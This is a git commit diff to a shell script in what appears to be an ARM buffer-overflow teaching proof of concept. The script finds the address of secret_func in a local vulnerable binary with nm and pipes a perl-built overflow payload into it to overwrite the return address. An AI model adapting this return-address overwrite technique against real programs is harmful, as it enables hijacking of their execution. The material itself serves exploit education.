2b03a1ee03eeaf140ba934323de80eeabcceb238
Kaiwan N Billimoria <kaiwan.billimoria@gmail.com>
2021-10-05 14:04:42 +0530

    show addr, minor

--- code/arm_bof_poc/secretfunc_try2.sh
+++ code/arm_bof_poc/secretfunc_try2.sh
@@ -5,5 +5,9 @@
 # 000104c4 t secret_func
 ## 0000067c t secret_func
 
-perl -e 'print "A"x12 . "B"x4 . "\xe9\x11\x00\x00"' | ./bof_vuln_lessprot
-#perl -e 'print "A"x12 . "B"x4 . "\x7c\x06\x00\x00"' | ./bof_vuln_reg
+PUT=./bof_vuln_reg  #./bof_vuln_lessprot
+addr=$(nm ${PUT} |grep -w secret_func|awk '{print $1}')
+echo "addr of secret_func() is ${addr}"
+#000104c4
+perl -e 'print "A"x12 . "B"x4 . "\xc4\x04\x01\x00"' | ${PUT}
+#perl -e 'print "A"x12 . "B"x4 . "\xe9\x11\x00\x00"' | ${PUT}
